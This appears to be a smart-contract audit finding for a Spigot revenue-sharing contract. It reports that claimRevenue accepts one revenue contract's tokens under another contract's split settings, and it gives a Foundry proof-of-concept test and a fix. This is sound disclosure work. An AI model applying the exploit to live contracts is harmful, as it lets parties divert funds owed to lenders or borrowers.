# Revenue tokens coming from a particular contract can be claimed with settings from another contract that would benefit a particular party

When claiming revenue from a contract, an associated setting to the contract's address is used to determine the split (how much is taken as revenue and how much goes to the treasury). The issue here is that revenue tokens associated with a particular revenue contract can be claimed using a different revenue contract, which will end up using a different setting.

## Impact

This may lead to any of the involved parties to act in a malicious way to benefit from claiming revenue using a setting from another contract to maximize their benefit. 

For example, a lender may use a setting where the `ownerSplit` is greater to maximize the tokens that are kept in the Spigot, or similarly, a borrower may use a setting that has the lowest `ownerSplit` value in order to maximize the percentage that goes to their treasury.

Since the function isn't protected, this also leaves the possibility that a griefer can use this to harm the lenders or the borrowers.

## PoC

In the following test, Revenue A has 90% split and Revenue B has 50% split. Revenue A pushes 100 tokens (TokenA) but we use Revenue B to claim, making the treasure have 50 tokens instead of the expected 10.

Note: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.

```
function test_ClaimRevenue_DifferentSettings() public {
    vm.startPrank(owner);
    
    RevenueToken tokenA = new RevenueToken();
    RevenueToken tokenB = new RevenueToken();
    
    MockRevenueContract revenueA = new MockRevenueContract(owner, tokenA);
    MockRevenueContract revenueB = new MockRevenueContract(owner, tokenB);
            
    spigot = new Spigot(owner, treasury, operator);
    
    // Settings A is 90 split (10% goes to treasury) but settings B is 50 (50% goes to treasury)
    ISpigot.Setting memory settingsA = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);
    require(spigot.addSpigot(address(revenueA), settingsA), "Failed to add spigot");
    
    ISpigot.Setting memory settingsB = ISpigot.Setting(50, claimPushPaymentFunc, transferOwnerFunc);
    require(spigot.addSpigot(address(revenueB), settingsB), "Failed to add spigot");
    
    // RevenueA pushes payment to spigot
    tokenA.mint(address(revenueA), 100);
    revenueA.sendPushPayment(address(spigot));
    
    // Use Revenue B to claim token A, this will use settings from B which are better for the borrower
    spigot.claimRevenue(address(revenueB), address(tokenA), hex"");
    
    // Treasury has 50 tokens instead of 10
    uint256 treasuryBalance = tokenA.balanceOf(treasury);
    assertEq(treasuryBalance, 50);
}
```

## Recommendation

Settings for a particular revenue contract should only be applicable on claims (and tokens) associated to that revenue stream, in order to prevent a bad actor from mixing claims from unrelated revenue contracts and tokens.
